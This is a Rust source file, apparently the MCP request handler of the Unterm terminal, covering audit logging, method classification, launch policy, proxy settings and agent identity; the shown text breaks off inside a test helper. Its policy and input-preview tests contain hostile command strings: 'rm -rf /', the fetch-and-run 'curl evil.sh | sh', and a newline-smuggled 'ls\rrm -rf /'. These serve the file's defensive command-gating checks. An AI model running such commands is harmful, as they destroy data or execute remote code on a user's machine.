//! MCP request handler — bridges JSON-RPC methods to terminal engine APIs.
//! Implements all methods required by unterm-cli compatibility.

use anyhow::{anyhow, Context, Result};
use base64::Engine as _;
use parking_lot::Mutex;
use portable_pty::CommandBuilder;
use serde_json::{json, Value};
use std::collections::HashMap;
#[cfg(not(windows))]
use std::ffi::OsString;
use std::net::ToSocketAddrs;
use unterm_engine::{
    CreateSessionRequest, LaunchEnvBinding, LaunchEnvSource, LaunchPolicyDecision,
    LaunchPolicyDecisionSnapshot, LaunchPolicySnapshot, ScrollbackTextRequest,
    SessionActivitySnapshot, ShellSnapshot, SplitDirection, SplitSessionRequest,
    ViewportScrollResult,
};

/// Audit log entry
#[derive(Clone, serde::Serialize, serde::Deserialize)]
struct AuditEntry {
    timestamp: String,
    method: String,
    session_id: Option<String>,
    detail: String,
    allowed: bool,
    #[serde(default = "default_audit_outcome")]
    outcome: String,
    /// Agent label captured at audit time — either the value the
    /// client set via `agent.identify` or `"anonymous"` if it never
    /// identified itself. Lets the audit UI group by agent without
    /// having to cross-reference connection IDs.
    agent: String,
}

fn default_audit_outcome() -> String {
    "executed".to_string()
}

/// The Core this surface is running in, as an instance record.
///
/// A front end registers itself in `~/.unterm/instances`, and for a long time
/// that was the only way to be on this surface's map. Since 0.68 the surface
/// lives in the Core, which registers nothing there -- so a headless Core
/// answered `instance.list` with an empty list and `instance.info` with an
/// empty record, `pid_alive: false` and all: an agent was told the Unterm it
/// was talking to did not exist. The Core does publish itself, in `core.json`
/// under its own state directory, and this is that record in the shape the
/// rest of this file already renders.
///
/// Read rather than remembered, and only when asked: a Core replaced between
/// two calls should answer as the one that is running now.
fn core_self_instance() -> Option<unterm_services::server_info::InstanceInfo> {
    let path = unterm_protocol::core_discovery_path()?;
    let raw = std::fs::read_to_string(path).ok()?;
    let value: Value = serde_json::from_str(&raw).ok()?;
    let pid = value.get("pid").and_then(Value::as_u64).unwrap_or(0) as u32;
    // A record whose process is gone is not an instance. The Core clears this
    // on the way out, but a kill -9 leaves it behind, and reporting it would
    // send the next caller at a port nobody is listening on.
    if pid == 0 || !unterm_services::server_info::pid_alive(pid) {
        return None;
    }
    let string = |key: &str| {
        value
            .get(key)
            .and_then(Value::as_str)
            .unwrap_or_default()
            .to_string()
    };
    let version = {
        let v = string("product_version");
        if v.is_empty() {
            string("version")
        } else {
            v
        }
    };
    Some(unterm_services::server_info::InstanceInfo {
        // Not a NATO name: those are handed out to front ends, and this is
        // not one. `unterm-cli --instance core` names it.
        id: "core".to_string(),
        mcp_port: value
            .get("mcp_port")
            .and_then(Value::as_u64)
            .unwrap_or(0) as u16,
        http_port: 0,
        auth_token: string("token"),
        pid,
        started_at: string("started_at"),
        title: None,
        cwd: None,
        profile: None,
        version: version.clone(),
        product_version: version,
        build_commit: string("build_commit"),
        protocol_version: string("protocol_version"),
        data_schema_version: value
            .get("data_schema_version")
            .and_then(Value::as_u64)
            .unwrap_or(0) as u32,
        process_role: unterm_protocol::ProcessRole::Core,
        platform: std::env::consts::OS.to_string(),
        agents: Vec::new(),
    })
}

fn core_discovery_build() -> Option<unterm_protocol::BuildHandshake> {
    // `core_discovery_path`, not `state_path`: the Core keeps its record in
    // its own state directory (`%LOCALAPPDATA%\Unterm`, `~/.local/share`),
    // which is not `~/.unterm`. Reading the wrong one found nothing, every
    // time, and the miss was invisible because the caller falls back to this
    // process's own identity -- which is right for a Core and wrong for
    // anyone asking about a Core that is not this process. `UNTERM_STATE_DIR`
    // overrides both, so every test that set it saw the two agree.
    let path = unterm_protocol::core_discovery_path()?;
    let raw = std::fs::read_to_string(path).ok()?;
    let value: Value = serde_json::from_str(&raw).ok()?;
    let product_version = value
        .get("product_version")
        .or_else(|| value.get("version"))?
        .as_str()?
        .to_string();
    Some(unterm_protocol::BuildHandshake {
        product_version,
        build_commit: value
            .get("build_commit")
            .and_then(Value::as_str)
            .unwrap_or("unknown")
            .to_string(),
        protocol_version: value
            .get("protocol_version")
            .and_then(Value::as_str)
            .unwrap_or("legacy")
            .to_string(),
        data_schema_version: value
            .get("data_schema_version")
            .and_then(Value::as_u64)
            .unwrap_or(0) as u32,
        process_role: value
            .get("process_role")
            .cloned()
            .and_then(|role| serde_json::from_value(role).ok())
            .unwrap_or(unterm_protocol::ProcessRole::Core),
        pid: value.get("pid").and_then(Value::as_u64).unwrap_or(0) as u32,
        started_at: value
            .get("started_at")
            .and_then(Value::as_str)
            .unwrap_or_default()
            .to_string(),
    })
}

fn audit_event_was_allowed(method: &str) -> bool {
    !matches!(
        method,
        "mcp.confirm.block" | "mcp.confirm.timeout" | "mcp.gateway.denied"
    )
}

/// Public MCP calls are deliberately partitioned into read-only and mutating
/// surfaces. Mutating calls are audited at the dispatch boundary even when a
/// leaf implementation forgets to add a richer operation-specific entry.
fn method_is_mutating(method: &str) -> bool {
    matches!(
        method,
        "agent.identify"
            | "agent.trust"
            | "agent.untrust"
            | "agent.signal"
            | "fleet.launch"
            | "fleet.clean"
            | "fleet.retry"
            | "review.verify"
            | "review.rollback"
            | "review.merge"
            | "review.discard"
            | "session.create"
            | "session.split"
            | "session.focus"
            | "session.input"
            | "session.paste"
            | "session.resize"
            | "session.destroy"
            | "session.set_env"
            | "session.suggest"
            | "session.suggest_cancel"
            | "exec.run"
            | "exec.send"
            | "exec.run_wait"
            | "exec.cancel"
            | "screen.scroll"
            | "screen.clear"
            | "signal.send"
            | "orchestrate.launch"
            | "orchestrate.broadcast"
            | "proxy.switch"
            | "proxy.speedtest"
            | "proxy.configure"
            | "proxy.disable"
            | "proxy.rotation"
            | "proxy.set_nodes"
            | "proxy.clash_select"
            | "proxy.clash_set_controller"
            | "workspace.save"
            | "workspace.restore"
            | "capture.screen"
            | "capture.window"
            | "capture.select"
            | "capture.clipboard"
            | "capture.scrollback"
            | "capture.window_scroll"
            | "upload.file"
            | "policy.set"
            | "system.launch_admin"
            | "instance.close"
            | "instance.set_title"
            | "instance.focus"
            | "instance.new_window"
            | "selftest.run"
            | "session.recording_start"
            | "session.recording_stop"
            | "session.recording_attach_trace"
            | "session.export_markdown"
            | "provider.bind"
            | "provider.pause"
            | "provider.resume"
            | "provider.unbind"
            | "provider.diagnose"
            | "provider.acquire"
            | "provider.call"
            | "provider.revoke_lease"
            | "approval.decide"
            | "scope.create"
            | "scope.archive"
            | "artifact.forget"
            | "task.export_evidence"
            | "supervisor.reconcile"
            | "system.snapshot"
            | "system.restore_snapshot"
            | "system.uninstall"
            | "system.upgrade"
            | "agent_session.start"
            | "agent_session.submit_input"
            | "agent_session.interrupt"
            | "agent_session.close"
            | "terminal.invoke"
            | "terminal.accept_lease"
            | "terminal.cancel"
    )
}

#[cfg(test)]
fn method_is_read_only(method: &str) -> bool {
    matches!(
        method,
        "meta.surface"
            | "session.list"
            | "session.status"
            | "session.get"
            | "session.idle"
            | "session.cwd"
            | "session.env"
            | "session.history"
            | "session.audit_log"
            | "session.suggest_status"
            | "session.suggest_list"
            | "session.recording_status"
            | "session.recording_list"
            | "session.recording_read"
            | "exec.status"
            | "screen.read"
            | "screen.text"
            | "screen.scrollback_text"
            | "screen.cursor"
            | "screen.search"
            | "screen.detect_errors"
            | "orchestrate.wait"
            | "proxy.status"
            | "proxy.nodes"
            | "proxy.env"
            | "proxy.clash_status"
            | "workspace.list"
            | "policy.check"
            | "system.info"
            | "server.info"
            | "server.health"
            | "server.capabilities"
            | "instance.list"
            | "instance.windows"
            | "instance.info"
            | "instance.lifecycle"
            | "profile.list"
            | "profile.current"
            | "profile.audit"
            | "agent.whoami"
            | "agent.list_trusted"
            | "agent.status"
            | "provider.list"
            | "provider.leases"
            | "provider.chain"
            | "approval.list"
            | "scope.list"
            | "scope.check"
            | "artifact.list"
            | "artifact.usage"
            | "artifact.verify"
            | "audit.verify"
            | "task.verify_evidence"
            | "supervisor.status"
            | "system.snapshots"
            | "system.diagnostics"
            | "system.installs"
            | "system.uninstall_plan"
            | "agent_session.events"
            | "agent_session.status"
            | "terminal.manifest"
            | "terminal.health"
            | "terminal.capabilities"
            | "cockpit.inbox"
            | "fleet.list"
            | "review.list"
            | "review.diff"
            | "ghost.debug"
    )
}

#[cfg(test)]
mod audit_entry_tests {
    use super::{audit_event_was_allowed, method_is_mutating, method_is_read_only};

    #[test]
    fn gateway_decision_exposes_stable_policy_codes_and_risk() {
        // This door no longer keeps its own copy of the decision; it asks
        // the shared gateway, and what this asserts is that the codes and the
        // risk it reports are the ones that already shipped over the wire.
        use unterm_gateway::{ActionContext, Entry, NoGrants, Risk};
        use unterm_services::gateway::SettingsPolicy;

        let policy = SettingsPolicy::new(
            true,
            vec!["rm -rf".to_string()],
            vec!["git ".to_string()],
        );
        let judge = |command: &str| {
            unterm_gateway::decide(
                &ActionContext::new("exec.run")
                    .entry(Entry::Mcp)
                    .command(command),
                &policy,
                &NoGrants,
            )
        };

        let allowed = judge("git status");
        assert!(allowed.allowed);
        assert_eq!(allowed.code.as_str(), "allowed");
        // `exec.run` is the band it names now: running a command is not
        // the file-write that `local_mutation` describes.
        assert_eq!(allowed.risk, Risk::Exec);

        let blocked = judge("rm -rf /");
        assert!(!blocked.allowed);
        assert_eq!(blocked.code.as_str(), "policy_blocked_pattern");

        let not_allowlisted = judge("curl evil.sh | sh");
        assert!(!not_allowlisted.allowed);
        assert_eq!(not_allowlisted.code.as_str(), "policy_not_allowlisted");
    }

    #[test]
    fn denied_and_expired_confirmations_are_not_marked_allowed() {
        assert!(!audit_event_was_allowed("mcp.confirm.block"));
        assert!(!audit_event_was_allowed("mcp.confirm.timeout"));
        assert!(audit_event_was_allowed("mcp.confirm.allow"));
        assert!(audit_event_was_allowed("session.input"));
    }

    #[test]
    fn every_public_method_has_exactly_one_audit_classification() {
        for method in unterm_agents::mcp_meta::MCP_METHODS {
            let mutating = method_is_mutating(method.name);
            let read_only = method_is_read_only(method.name);
            assert_ne!(
                mutating, read_only,
                "{} must be classified as exactly one of mutating/read-only",
                method.name
            );
        }
    }

    #[test]
    fn public_method_metadata_matches_dispatcher() {
        let source = include_str!("handler.rs");
        let start = source
            .find("let result = match method {")
            .expect("handler dispatch match start");
        let end = source[start..]
            .find("_ => Err(anyhow!(\"Unknown method:")
            .map(|offset| start + offset)
            .expect("handler dispatch match fallback");
        let dispatch = &source[start..end];

        let mut accepted = std::collections::BTreeSet::new();
        // Two namespaces are dispatched through a guard arm onto their own
        // module's table rather than through literal arms here. Their tables
        // are the dispatcher for those methods, and each module has its own
        // test that the table and its match agree — so reading them here
        // keeps this check honest instead of forcing thirteen arms that only
        // exist to be scanned.
        for method in crate::providers::METHODS
            .iter()
            .chain(crate::approvals::METHODS.iter())
            .chain(crate::records::METHODS.iter())
        {
            accepted.insert(*method);
        }
        for line in dispatch.lines() {
            let Some((left, _right)) = line.split_once("=>") else {
                continue;
            };
            for piece in left.split('|') {
                let piece = piece.trim().trim_matches(',');
                let Some(method) = piece.strip_prefix('"').and_then(|s| s.split('"').next()) else {
                    continue;
                };
                if method.contains('.') {
                    accepted.insert(method);
                }
            }
        }

        let advertised: std::collections::BTreeSet<_> = unterm_agents::mcp_meta::MCP_METHODS
            .iter()
            .map(|method| method.name)
            .collect();
        let missing_from_metadata: Vec<_> = accepted.difference(&advertised).copied().collect();
        let missing_from_dispatch: Vec<_> = advertised.difference(&accepted).copied().collect();

        assert!(
            missing_from_metadata.is_empty() && missing_from_dispatch.is_empty(),
            "MCP metadata/dispatcher drift: missing_from_metadata={missing_from_metadata:?}, missing_from_dispatch={missing_from_dispatch:?}"
        );
    }

    #[test]
    fn destructive_and_policy_operations_are_mutating() {
        for method in [
            "session.destroy",
            "fleet.clean",
            "review.rollback",
            "review.merge",
            "review.discard",
            "policy.set",
        ] {
            assert!(method_is_mutating(method), "{method}");
        }
    }
}

std::thread_local! {
    /// Connection ID of the request currently being handled on this
    /// thread. `handle()` writes this on entry and clears it on exit
    /// (via the RAII guard below). Audit-writing helpers read it to
    /// stamp entries with the calling agent's name.
    static CURRENT_CONN_ID: std::cell::RefCell<Option<u64>> =
        std::cell::RefCell::new(None);
    /// Set by `audit()` during the current dispatch. This makes the
    /// dispatch-level fallback concurrency-safe and avoids duplicate entries
    /// when a leaf already records richer details.
    static AUDIT_WRITTEN_THIS_CALL: std::cell::Cell<bool> =
        const { std::cell::Cell::new(false) };
}

/// RAII guard that clears the thread-local connection ID even if the
/// handler panics. Keeps audit attribution from leaking between
/// successive requests on the same thread.
struct ConnectionScope;

impl Drop for ConnectionScope {
    fn drop(&mut self) {
        CURRENT_CONN_ID.with(|cell| *cell.borrow_mut() = None);
    }
}

fn current_agent_label() -> String {
    let conn_id = CURRENT_CONN_ID.with(|cell| *cell.borrow());
    if let Some(id) = conn_id {
        let state = mcp_state().lock();
        if let Some(identity) = state.agents_by_connection.get(&id) {
            return identity.name.clone();
        }
    }
    "anonymous".to_string()
}

fn current_client_role() -> Option<unterm_protocol::ProcessRole> {
    let conn_id = CURRENT_CONN_ID.with(|cell| *cell.borrow())?;
    let state = mcp_state().lock();
    state
        .clients_by_connection
        .get(&conn_id)
        .map(|client| client.process_role)
}

/// Pull the agent label off the most recent audit entry. Used in
/// `audit()` to mark "first PTY write from this agent" — by the time
/// we get here, the new entry has already been pushed with its
/// `agent` field set by `current_agent_label()`, so re-doing the
/// thread-local lookup would just produce the same value at the cost
/// of re-acquiring the same lock.
fn entry_agent_from_last_audit(state: &McpState) -> String {
    state
        .audit_log
        .last()
        .map(|e| e.agent.clone())
        .unwrap_or_else(|| "anonymous".to_string())
}

fn shell_command_builder(command: &str) -> CommandBuilder {
    #[cfg(windows)]
    {
        let mut builder = CommandBuilder::new("cmd.exe");
        builder.arg("/C");
        builder.arg(command);
        builder
    }
    #[cfg(not(windows))]
    {
        let shell = std::env::var_os("SHELL").unwrap_or_else(|| OsString::from("/bin/sh"));
        let mut builder = CommandBuilder::new(shell);
        builder.arg("-lc");
        builder.arg(command);
        builder
    }
}

fn argv_command_builder(params: &Value) -> Result<Option<(Vec<String>, CommandBuilder)>> {
    let Some(argv) = params.get("argv") else {
        return Ok(None);
    };
    let argv = argv
        .as_array()
        .ok_or_else(|| anyhow!("session.create argv must be an array of strings"))?
        .iter()
        .map(|item| {
            item.as_str()
                .map(str::to_string)
                .ok_or_else(|| anyhow!("session.create argv must contain only strings"))
        })
        .collect::<Result<Vec<_>>>()?;
    if argv.is_empty() || argv[0].trim().is_empty() {
        return Err(anyhow!("session.create argv must include a program name"));
    }
    let mut builder = CommandBuilder::new(&argv[0]);
    for arg in &argv[1..] {
        builder.arg(arg);
    }
    Ok(Some((argv, builder)))
}

fn resolve_profile_env(profile: &str) -> Result<(String, Vec<(String, String)>)> {
    let registry = unterm_profile::ProfileRegistry::load().context("load profile registry")?;
    let (profile_id, _) = registry
        .resolve(profile)
        .ok_or_else(|| anyhow!("profile not found or ambiguous: {profile}"))?;
    let profile_id = profile_id.to_string();
    let store = unterm_profile::default_store().context("open profile secret store")?;
    let env = registry
        .resolve_env(store.as_ref(), &profile_id)
        .with_context(|| format!("resolve profile env for {profile_id}"))?;
    Ok((profile_id, env.into_iter().collect()))
}

fn launch_policy_for_env(
    env: &[(String, String)],
    overlay_keys: &[String],
    profile_id: Option<&str>,
) -> LaunchPolicySnapshot {
    let mut proxy_env_keys = Vec::new();
    let env = env
        .iter()
        .map(|(key, _)| {
            let upper = key.to_ascii_uppercase();
            let source = if overlay_keys
                .iter()
                .any(|overlay| overlay.eq_ignore_ascii_case(key))
            {
                LaunchEnvSource::Overlay
            } else if key.eq_ignore_ascii_case("UNTERM_PROFILE") {
                LaunchEnvSource::Profile
            } else if matches!(
                upper.as_str(),
                "HTTP_PROXY" | "HTTPS_PROXY" | "ALL_PROXY" | "NO_PROXY"
            ) {
                proxy_env_keys.push(key.clone());
                LaunchEnvSource::Proxy
            } else if profile_id.is_some() {
                LaunchEnvSource::Profile
            } else {
                LaunchEnvSource::Explicit
            };
            LaunchEnvBinding {
                key: key.clone(),
                source,
            }
        })
        .collect();
    proxy_env_keys.sort();
    proxy_env_keys.dedup();
    LaunchPolicySnapshot {
        profile: profile_id.map(str::to_string),
        env,
        proxy_env_keys,
        ..Default::default()
    }
}

fn bool_param(params: &Value, name: &str) -> Option<bool> {
    params.get(name).and_then(|value| {
        value.as_bool().or_else(|| {
            value
                .as_str()
                .map(str::trim)
                .and_then(|raw| match raw.to_ascii_lowercase().as_str() {
                    "1" | "true" | "yes" | "on" | "admin" | "elevated" => Some(true),
                    "0" | "false" | "no" | "off" | "none" | "standard" => Some(false),
                    _ => None,
                })
        })
    })
}

fn apply_launch_policy_requests(params: &Value, policy: &mut LaunchPolicySnapshot) {
    if let Some(domain) = params
        .get("domain")
        .and_then(|value| value.as_str())
        .map(str::trim)
        .filter(|value| !value.is_empty())
    {
        policy.domain = if matches!(
            domain.to_ascii_lowercase().as_str(),
            "local" | "default" | "local-domain"
        ) {
            LaunchPolicyDecisionSnapshot::new(
                LaunchPolicyDecision::Applied,
                true,
                "local-domain launch requested and applied",
            )
        } else {
            LaunchPolicyDecisionSnapshot::new(
                LaunchPolicyDecision::Unsupported,
                false,
                format!("non-local domain '{domain}' is not supported by next-core launch"),
            )
        };
    }

    let privilege_requested = bool_param(params, "privilege")
        .or_else(|| bool_param(params, "elevated"))
        .unwrap_or(false);
    if privilege_requested {
        policy.privilege = LaunchPolicyDecisionSnapshot::new(
            LaunchPolicyDecision::Unsupported,
            false,
            "privilege elevation must be handled by host launch flow",
        );
    }

    if bool_param(params, "proxy_rotation").unwrap_or(false) {
        policy.proxy_rotation = LaunchPolicyDecisionSnapshot::new(
            LaunchPolicyDecision::Deferred,
            false,
            "proxy rotation is requested but remains product-managed before launch",
        );
    }

    if bool_param(params, "restart").unwrap_or(false) {
        policy.restart = LaunchPolicyDecisionSnapshot::new(
            LaunchPolicyDecision::Unsupported,
            false,
            "restart launch policy is not supported by session.create",
        );
    }
}

fn cwd_url_to_path(raw: &str) -> Option<String> {
    if raw.trim().is_empty() {
        return None;
    }
    if let Ok(url) = url::Url::parse(raw) {
        if url.scheme() == "file" {
            return url
                .to_file_path()
                .ok()
                .map(|p| p.to_string_lossy().to_string());
        }
    }
    Some(raw.to_string())
}

fn workspace_template_launch_decision(
    saved_id: Value,
    title: &str,
    cwd: Option<&str>,
    profile: Option<&str>,
    command: Option<&str>,
) -> Value {
    json!({
        "source": "workspace.restore",
        "saved_id": saved_id,
        "title": title,
        "cwd_provided": cwd.is_some(),
        "profile_requested": profile.is_some(),
        "command_provided": command.is_some(),
        "values_redacted": true,
    })
}

/// The shell a pane created through this surface should start.
///
/// Named explicitly rather than left as "the default program", because the
/// encoding rewrite deliberately does not touch a default-prog builder: in
/// the GUI a mux resolves that later and rewrites it then. next-core has no
/// later step, so a pane created here would start a shell that writes its
/// console codepage and shows as boxes. Naming the same shell we would have
/// got makes it a shell we can set the encoding on.
fn launch_shell_for_new_pane() -> Option<CommandBuilder> {
    let configured = unterm_services::settings::current()
        .shell
        .clone()
        .or_else(unterm_services::settings::preferred_platform_shell);
    let mut command = match configured {
        Some(argv) => {
            let mut command = CommandBuilder::new(&argv[0]);
            for arg in &argv[1..] {
                command.arg(arg);
            }
            command
        }
        None => {
            let default = CommandBuilder::new_default_prog();
            // `get_shell` gives the program the platform default resolves to.
            CommandBuilder::new(default.get_shell())
        }
    };
    unterm_engine::apply_terminal_identity(&mut command);
    let mut command = Some(command);
    unterm_services::launch_env::apply_unterm_windows_utf8(&mut command);
    unterm_services::launch_env::apply_unterm_profile_env(&mut command);
    unterm_services::launch_env::apply_unterm_proxy_env(&mut command);
    command
}

fn default_shell_launch_decision(command_provided: bool) -> Value {
    if command_provided {
        Value::Null
    } else {
        let command = CommandBuilder::new_default_prog();
        json!({
            "source": "portable_pty.default_prog",
            "shell": command.get_shell(),
            "values_redacted": true,
        })
    }
}

fn instance_lifecycle_snapshot(
    info: &unterm_services::server_info::InstanceInfo,
    is_current: bool,
) -> Value {
    lifecycle_snapshot_for_pid(info.pid, is_current)
}

fn lifecycle_snapshot_for_pid(pid: u32, is_current: bool) -> Value {
    let window = unterm_engine::window_identity();
    json!({
        "state": "live",
        "liveness_source": "pid",
        "pid_alive": unterm_services::server_info::pid_alive(pid),
        "is_current": is_current,
        "registry_owner": "server_info",
        "metadata_owner": "product_registry",
        "window_owner": window.window_owner,
        "title_owner": "server_info",
        "focus_owner": window.window_owner,
        "native_window_lifecycle": window.native_window_lifecycle,
        "uses_host_window": window.uses_host_window,
        "values_redacted": true,
    })
}

/// Command execution policy
#[derive(Clone, serde::Serialize, serde::Deserialize)]
struct CommandPolicy {
    enabled: bool,
    blocked_patterns: Vec<String>,
    allowed_patterns: Vec<String>,
}

/// What the policy says about one command.
/// One decision path for `policy.check` and the internal gate, so the
/// answer an agent previews is the answer the execution gets.
///
/// A block always wins over an allow: `allowed_patterns` narrows what may
/// run, it never overrides an explicit block. An empty allowlist means
/// "no allowlist", not "allow nothing" -- the shipped default has to keep
/// working for configs that only name blocks.
impl Default for CommandPolicy {
    fn default() -> Self {
        Self {
            enabled: false,
            blocked_patterns: Vec::new(),
            allowed_patterns: Vec::new(),
        }
    }
}

#[derive(Clone, serde::Serialize, serde::Deserialize)]
#[serde(default)]
struct ProxyNodeConfig {
    name: String,
    url: String,
    /// Transient probe results — recomputed on every `proxy.status`, never
    /// trusted from disk (a node's reachability/latency now has nothing to do
    /// with what was true last time it was written). `skip_serializing` keeps
    /// proxy.json to just name+url so hand-edits stay clean.
    #[serde(skip_serializing)]
    latency_ms: Option<u64>,
    #[serde(skip_serializing)]
    available: bool,
}

impl Default for ProxyNodeConfig {
    fn default() -> Self {
        Self {
            name: String::new(),
            url: String::new(),
            latency_ms: None,
            available: false,
        }
    }
}

/// Auto-rotation: keep a user-chosen pool of nodes healthy. A background
/// monitor probes the current node every `interval_secs`; when it goes
/// unreachable, it probes the whole pool and switches to the fastest live one.
#[derive(Clone, serde::Serialize, serde::Deserialize)]
#[serde(default)]
struct RotationSettings {
    enabled: bool,
    /// Clash/mihomo Selector group to rotate within. When non-empty, rotation
    /// runs in *clash mode*: `pool` holds node names inside this group and we
    /// fail over by switching the group's selection via the controller API.
    /// When empty, rotation runs in legacy *endpoint mode* (`pool` holds
    /// `proxy.nodes` names and we swap the injected HTTP_PROXY url).
    group: String,
    /// Node names eligible for rotation. Empty pool disables rotation even if
    /// `enabled` (nothing to rotate to).
    pool: Vec<String>,
    /// Seconds between health checks of the active node.
    interval_secs: u64,
}

impl Default for RotationSettings {
    fn default() -> Self {
        Self {
            enabled: false,
            group: String::new(),
            pool: Vec::new(),
            interval_secs: 30,
        }
    }
}

#[derive(Clone, serde::Serialize, serde::Deserialize)]
#[serde(default)]
struct ProxySettings {
    enabled: bool,
    mode: String,
    http_proxy: Option<String>,
    socks_proxy: Option<String>,
    no_proxy: String,
    current_node: Option<String>,
    nodes: Vec<ProxyNodeConfig>,
    rotation: RotationSettings,
    /// Manual Clash/mihomo controller override (host:port) for when
    /// auto-discovery can't find it — e.g. on Windows where there's no Unix
    /// socket and the controller isn't in a scanned config. Empty = auto.
    #[serde(default)]
    clash_controller: String,
    /// Bearer secret for the manual controller (if the API requires one).
    #[serde(default)]
    clash_secret: String,
}

impl Default for ProxySettings {
    fn default() -> Self {
        Self {
            enabled: false,
            mode: "off".to_string(),
            http_proxy: None,
            socks_proxy: None,
            no_proxy: "localhost,127.0.0.1,::1".to_string(),
            current_node: None,
            nodes: Vec::new(),
            rotation: RotationSettings::default(),
            clash_controller: String::new(),
            clash_secret: String::new(),
        }
    }
}

/// What an MCP client tells us about itself via `agent.identify`.
/// Identity is *self-asserted* — no cryptographic verification, just a
/// label the agent uses so audit logs and the (future) confirmation
/// flow can group by "claude-code" vs "unterm-cli" vs "anonymous".
#[derive(Clone, serde::Serialize)]
pub struct AgentIdentity {
    pub name: String,
    pub version: Option<String>,
    pub capabilities: Vec<String>,
    /// Source address of the TCP connection (`127.0.0.1:port`). Useful
    /// for distinguishing two concurrent connections claiming the same
    /// agent name.
    pub peer_addr: String,
    /// RFC3339 timestamp of when `agent.identify` was called on this
    /// connection.
    pub identified_at: String,
}

/// Per-connection context passed in to every `handle()` call. Lets
/// methods that need it (`agent.identify`, audit annotators) tie the
/// request back to a specific TCP connection without resorting to
/// thread-locals at the call site.
pub struct ConnectionContext {
    pub conn_id: u64,
    pub peer_addr: String,
}

impl ConnectionContext {
    /// Synthetic context for in-process callers that aren't talking to
    /// the MCP TCP server — e.g. the web settings HTTP handlers that
    /// dispatch via the same `McpHandler` instance. `conn_id` 0 is
    /// reserved (the TCP server starts allocating at 1).
    pub fn internal(source: &str) -> Self {
        Self {
            conn_id: 0,
            peer_addr: format!("internal:{source}"),
        }
    }
}

#[cfg(test)]
mod client_identity_tests {
    use super::{ConnectionContext, McpHandler};
    use serde_json::json;

    #[test]
    fn whoami_reports_authenticated_client_role() {
        let handler = McpHandler::new();
        let conn_id = 9_000_000 + u64::from(std::process::id());
        let ctx = ConnectionContext {
            conn_id,
            peer_addr: "127.0.0.1:12345".to_string(),
        };
        handler.register_client(
            conn_id,
            unterm_protocol::BuildHandshake::current(
                unterm_protocol::ProcessRole::Cli,
                std::process::id(),
                "test",
            ),
        );

        let who = handler.handle(&ctx, "agent.whoami", &json!({})).unwrap();

        assert_eq!(who["name"], "anonymous");
        assert_eq!(who["client_role"], "cli");
        handler.drop_connection(conn_id);
    }
}

#[cfg(test)]
mod input_preview_tests {
    use super::input_preview;

    #[test]
    fn the_command_leads_so_a_narrow_banner_cannot_cut_it_away() {
        let preview = input_preview("rm -rf /");
        assert!(
            preview.starts_with("rm -rf /"),
            "metadata came before the command: {preview}"
        );
        assert!(
            preview.contains("8 bytes"),
            "the size was dropped: {preview}"
        );
    }

    #[test]
    fn a_newline_with_text_behind_it_is_flagged() {
        // The injection shape: approve `ls`, get `rm -rf /` too.
        let preview = input_preview("ls\rrm -rf /");
        assert!(preview.starts_with("[ctrl]"), "not flagged: {preview}");
        assert!(
            preview.contains("\\r"),
            "the terminator was hidden: {preview}"
        );
    }

    #[test]
    fn a_trailing_newline_is_not_flagged() {
        // How every ordinary command is submitted. Flagging it would make
        // the warning meaningless by making it constant.
        for ordinary in ["ls\r", "ls\n", "ls\r\n", "git status\r"] {
            let preview = input_preview(ordinary);
            assert!(
                !preview.contains("[ctrl]"),
                "ordinary submission flagged as dangerous: {preview}"
            );
        }
    }

    #[test]
    fn invisible_control_bytes_are_still_flagged() {
        let preview = input_preview("ls\u{1b}[31m");
        assert!(preview.starts_with("[ctrl]"), "not flagged: {preview}");
        assert!(preview.contains("\\x1b"), "escape not rendered: {preview}");
    }
}

#[cfg(test)]
mod engine_neutral_handler_tests {
    use super::{
        audit_log_snapshot_json, compute_agent_cwd, launch_shell_for_new_pane, mcp_state,
        shell_command_builder, ConnectionContext, McpHandler,
    };
    use anyhow::{anyhow, Context, Result};
    use parking_lot::Mutex;
    use serde_json::{json, Value};
    use std::path::{Path, PathBuf};
    use std::process::Command;
    use std::sync::{
        atomic::{AtomicU64, Ordering},
        OnceLock,
    };
    use unterm_engine::{next_core, CreateSessionRequest, InputEngine, SessionEngine};

    /// A pane an agent asks for must announce the same terminal as one
    /// the user opens. This path built its own `CommandBuilder` and set
    /// `TERM` by hand, so it never learned about `COLORTERM` — caught in
    /// a Linux VM, where the two kinds of pane disagreed; on macOS the
    /// value was usually inherited and the split stayed hidden.
    #[test]
    fn a_pane_born_of_an_mcp_request_announces_a_colour_terminal() {
        let command = launch_shell_for_new_pane().expect("a shell to launch");
        assert_eq!(
            command.get_env("TERM").and_then(|value| value.to_str()),
            Some("xterm-256color")
        );
        assert_eq!(
            command.get_env("COLORTERM").and_then(|value| value.to_str()),
            Some("truecolor")
        );
    }

    fn env_lock() -> &'static Mutex<()> {
        static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
        LOCK.get_or_init(|| Mutex::new(()))
    }

    static NEXT_TMP_REVIEW_REPO: AtomicU64 = AtomicU64::new(0);

    fn git_test(repo: &Path, args: &[&str]) -> Result<String> {
        let mut cmd = Command::new("git");
        cmd.arg("-C").arg(repo).args(args);
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            cmd.creation_flags(0x0800_0000);
        }
        let out = cmd.output().with_context(|| format!("run git {args:?}"))?;
        if !out.status.success() {
            return Err(anyhow!(
                "git {}: {}",
                args.first().unwrap_or(&""),
                String::from_utf8_lossy(&out.stderr).trim()
            ));
        }
        Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
    }

    fn tmp_review_repo() -> Result<PathBuf> {
        let dir = std::env::temp_dir().join(format!(
            "unterm-next-core-review-{}-{}-{}",
            std::process::id(),
            chrono::Utc::now().timestamp_millis(),
            NEXT_TMP_REVIEW_REPO.fetch_add(1, Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&dir)?;
        git_test(&dir, &["init", "-q"])?;
        git_test(&dir, &["config", "user.email", "t@t"])?;
        git_test(&dir, &["config", "user.name", "t"])?;
        git_test(&dir, &["config", "core.autocrlf", "false"])?;
        std::fs::write(dir.join("a.txt"), "one\n")?;
        git_test(&dir, &["add", "-A"])?;
        git_test(&dir, &["commit", "-q", "-m", "init"])?;
        Ok(dir)
    }

    fn wait_for_verification_passed(
        id: &str,
    ) -> Result<unterm_services::cockpit::verification::VerificationRecord> {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        loop {
            if let Some(record) = unterm_services::cockpit::verification::get(id) {
                if record.status
                    == unterm_services::cockpit::verification::VerificationStatus::Passed
                {
                    return Ok(record);
                }
                if matches!(
                    record.status,
                    unterm_services::cockpit::verification::VerificationStatus::Failed
                        | unterm_services::cockpit::verification::VerificationStatus::TimedOut
                ) {
